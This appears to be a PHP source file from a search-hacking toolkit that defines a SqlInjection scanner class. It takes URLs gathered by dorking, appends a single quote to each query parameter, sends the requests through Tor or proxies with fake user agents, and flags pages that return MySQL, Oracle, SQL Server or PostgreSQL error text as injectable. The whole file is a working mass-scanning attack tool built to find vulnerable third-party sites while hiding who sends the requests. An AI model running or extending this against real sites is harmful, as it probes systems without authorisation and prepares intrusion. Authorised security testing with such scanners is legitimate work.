<?php

namespace Aszone\Component\SearchHacking\Lib\Vunerabilities;

use Respect\Validation\Validator as v;
use Aszone\Component\SearchHacking\Lib\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;

class SqlInjection
{
    public $targets;
    public $target;

    public $tor;

    public $commandData;

    public function __construct($commandData, $targets)
    {
        //Check command of entered.
        $defaultEnterData = $this->defaultEnterData();
        $this->commandData = array_merge($defaultEnterData, $commandData);
        if ($this->commandData['torl']) {
            $this->commandData['tor'] = $this->commandData['torl'];
        }
        $this->targets = $targets;
    }

    private function defaultEnterData()
    {
        $dataDefault['dork'] = false;
        $dataDefault['pl'] = false;
        $dataDefault['tor'] = false;
        $dataDefault['torl'] = false;
        $dataDefault['virginProxies'] = false;
        $dataDefault['proxyOfSites'] = false;

        return $dataDefault;
    }

    public function check()
    {
        $result = array();
        if ($this->targets) {
            foreach ($this->targets as $keySearchEngenier => $searchEngenier) {
                foreach ($searchEngenier as $keyTarget => $target) {
                    $this->target = urldecode(urldecode($target));
                    if ($this->checkSuccess()) {
                        $result[] = $this->checkSuccess();
                    }
                }
            }
        }

        return $result;
    }
    protected function checkSuccess()
    {
        $isValidSqli = $this->isSqlInjection();
        if (!$isValidSqli) {
            return false;
        }

        return $this->setVull();
    }

    protected function isSqlInjection()
    {
        $explodeUrl = parse_url($this->target);
        if (isset($explodeUrl['query'])) {
            return true;
        }

        return false;
    }

    protected function getWordListInArray($wordlist)
    {
        $checkFileWordList = v::file()->notEmpty()->validate($wordlist);
        if ($checkFileWordList) {
            $targetResult = file($wordlist, FILE_IGNORE_NEW_LINES);

            return $targetResult;
        }

        return false;
    }

    protected function setVull()
    {
        $url = $this->generateUrlByExploit();
        echo "\n url =>".$url."\n";

        return $this->setAttack($url);
    }

    protected function generateUrlByExploit()
    {
        $explodeUrl = parse_url($this->target);
        $explodeQuery = explode('&', $explodeUrl['query']);
        $queryFinal = '';
        //Identify and sets urls of values of Get
        foreach ($explodeQuery as $keyQuery => $query) {
            $queryFinal .= $query."'";
            //$explodeQueryEqual=explode("=",$query);
            //$wordsValue[$keyQuery]=$explodeQueryEqual[1];
            //$wordsKey[$keyQuery]=$explodeQueryEqual[0];
        }

        return $explodeUrl['scheme'].'://'.$explodeUrl['host'].$explodeUrl['path'].'?'.$queryFinal;
    }

    protected function setAttack($url)
    {
        $header = new FakeHeaders();
        $client = new Client(['defaults' => [
            'headers' => ['User-Agent' => $header->getUserAgent()],
            'proxy' => $this->commandData['tor'],
            'timeout' => 30,
            ],
        ]);
        try {
            $body = $client->get($url)->getBody()->getContents();
            if ($body) {
                if ($this->checkErrorSql($body)) {
                    return $url;
                }
            }
        } catch (\Exception $e) {
            if ($e->getCode() != '404' and $e->getCode() != '403') {
                return $url;
            }

            echo 'Error code => '.$e->getCode()."\n";
        }

        return false;
    }

    protected function checkErrorSql($body)
    {
        //echo $body;
        $errors = $this->getErrorsOfList();
        foreach ($errors as $error) {
            $isValid = strpos($body, $error);
            if ($isValid !== false) {
                return true;
            }
        }

        return false;
    }

    protected function getErrorsOfList()
    {
        $errorsMysql = parse_ini_file(__DIR__.'/resource/Errors/mysql.ini');
        $errorsMariaDb = parse_ini_file(__DIR__.'/resource/Errors/mariadb.ini');
        $errorsOracle = parse_ini_file(__DIR__.'/resource/Errors/oracle.ini');
        $errorssqlServer = parse_ini_file(__DIR__.'/resource/Errors/sqlserver.ini');
        $errorsPostgreSql = parse_ini_file(__DIR__.'/resource/Errors/postgresql.ini');

        return array_merge($errorsMysql, $errorsMariaDb, $errorsOracle, $errorssqlServer, $errorsPostgreSql);
    }
}
